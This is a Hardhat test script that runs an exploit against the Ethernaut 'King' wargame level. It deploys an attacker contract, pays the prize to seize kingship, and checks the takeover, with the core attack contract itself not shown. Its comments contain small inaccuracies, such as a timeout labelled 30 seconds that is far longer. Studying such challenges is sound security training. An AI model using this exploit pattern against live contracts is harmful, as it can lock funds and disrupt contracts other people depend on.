const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("King Exploit using attack contract", function () {
  let kingContract, attacker, contractAddress, balance, prize, king;

  before("Setup for attack", async function () {
    [attacker] = await ethers.getSigners();
    contractAddress = "0x5def50214787335584f51c7EFa91C66d166CB57B"; //instance address
    // Deploy my own attacker contract
    const attackerContractFactory = await ethers.getContractFactory("Attack");
    attackerContract = await attackerContractFactory.deploy(contractAddress);

    await attackerContract.deployed();

    // insert contract address of ethernaut challenge
    kingContract = await ethers.getContractAt("King", contractAddress);
  });

  it("perform exploit", async function () {
    // Attack flow

    // 1) grab the prize and king data
    prize = await kingContract.prize();

    prizeValueInEth = ethers.utils.formatEther(prize);

    let oldKing = await kingContract._king();

    console.log("The old king is: ", oldKing); // should be the ethernaut owner

    // 2) invoke our attack function with the prize value to become king
    let txAttack = await attackerContract.attack({
      value: ethers.utils.parseEther(prizeValueInEth),
    });

    let txReceipt = await txAttack.wait();

    console.log("The txAttack tx data is :", txAttack);
    console.log("The txAttack receipt is : ", txReceipt);

    // 3) grab the new king and log it to the console && Log the attacker contract to the console
    king = await kingContract._king();
    console.log("The new king is : ", king); // should be our attacker contract address

    console.log("The attacker contract address is: ", attackerContract.address);
  }).timeout(3000000); //Allows the attack to be ran for 30 seconds

  after("confirm exploit", async function () {
    // check if our contract is the new king
    expect(king).to.be.eq(attackerContract.address);
    // // check if sending to the attack contract rejects
    // expect(
    //   await attacker.sendTransaction({
    //     to: attackerContract.address,
    //     value: ethers.utils.parseEther(prizeValueInEth), // Sends exactly .001 ether
    //     gasLimit: 200000,
    //   })
    // ).to.be.reverted;
  });
});
